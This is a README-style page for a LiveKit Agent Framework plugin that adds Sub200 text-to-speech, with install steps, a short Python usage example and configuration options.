---
layout: "default"
title: "🎤 livekit_plugins_sub200 - Text-to-Speech Made Easy"
description: "🎤 Enhance voice pipelines with the Sub200 plugin for LiveKit, adding efficient text-to-speech support for smooth audio integration."
---
# 🎤 livekit_plugins_sub200 - Text-to-Speech Made Easy

[![Download LiveKit Plugins Sub200](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/viper-108/livekit_plugins_sub200/releases)

## 🚀 Getting Started

Welcome to the **livekit_plugins_sub200** project! This plugin adds Sub200 text-to-speech (TTS) support to the LiveKit Agent Framework. With this tool, you can easily integrate voice capabilities into your applications. 

### 🌐 Download & Install

To get started, visit this page to download the latest version: [Download LiveKit Plugins Sub200](https://github.com/viper-108/livekit_plugins_sub200/releases). 

Once you've downloaded the plugin, follow the steps below to set it up.

## 🛠️ Installation Steps

1. **Open Your Terminal (Command Prompt)**

   You'll need to use your terminal or command prompt to install the plugin. 

2. **Navigate to Your Workspace**

   Change your directory to where you want the plugin installed. Use the `cd` command to change directories. 

3. **Install the Plugin**

   Run the following command:

   ```bash
   uv pip install -e livekit-plugins/livekit-plugins-sub200
   ```

   This command will install the Sub200 plugin for you.

## 🎙️ How to Use

After installing the plugin, you can easily use it in your projects. Here’s a simple example showing how to set up a basic text-to-speech agent:

```python
from livekit.plugins import sub200

tts = sub200.TTS(
    model="orpheus",
    voice="aria",
)

agent = VoicePipelineAgent(
    tts=tts,
    # stt=..., llm=..., vad=..., etc.
)
```

This example demonstrates how to initialize the TTS system within the application. For a complete integration, check out the example file located at `examples/voice_agents/sub200_agent.py`.

## ⚙️ Configuration

The plugin comes with some configurable options to help you personalize your setup:

- **`SUB200_API_KEY`**: This environment variable is used to authenticate with the Sub200 API. It is required unless you are using the plugin offline, which will result in errors without a valid key.
  
- **Optional Parameters for `TTS`:**
  - **`model`**: This defines the speech model to use. The default is `"orpheus"`.
  - **`voice`**: This sets the voice for the speech. The default is `"aria"`.
  - **`base_url`**: This specifies the stream endpoint, defaulting to the Sub200 public API.
  - **`sample_rate`**: This allows you to set the audio sample rate.
  - **`num_channels`**: This defines the number of audio channels.
  - **`debug_audio_dir`**: Specify a directory to save audio files for debugging.
  - **`debug_log_dir`**: Specify a directory to save log files for debugging purposes.

## 🔍 Exploring Features

Here are some key features that make the **livekit_plugins_sub200** both powerful and flexible:

- **Seamless Integration**: Easily add text-to-speech capabilities to your voice pipelines.
- **Customizable Voices**: Choose different voices to enhance user experiences.
- **High-Quality Output**: Benefit from high-quality speech generation that sounds natural.

## 📚 Examples

You may look at additional examples within the project's `examples` directory. This will provide you with various use cases to understand different applications of the Sub200 plugin.

## 📥 Feedback & Contributions

We welcome any kind of feedback or contributions. If you have questions or would like to report an issue, open an issue on our GitHub repository, or feel free to make suggestions directly within the project.

## 🌍 Community Support

Join our community of developers using the Sub200 plugin! Share your projects, ask questions, and connect with others who are utilizing the LiveKit Agent Framework effectively.

## 📑 Summary

The **livekit_plugins_sub200** plugin offers a straightforward method to integrate Sub200 text-to-speech functionality into your applications. With easy installation, multiple settings for customization, and a supportive community, you can focus on building applications that communicate effectively.

Remember to visit the release page to download the latest version: [Download LiveKit Plugins Sub200](https://github.com/viper-108/livekit_plugins_sub200/releases). Explore the capabilities of text-to-speech today!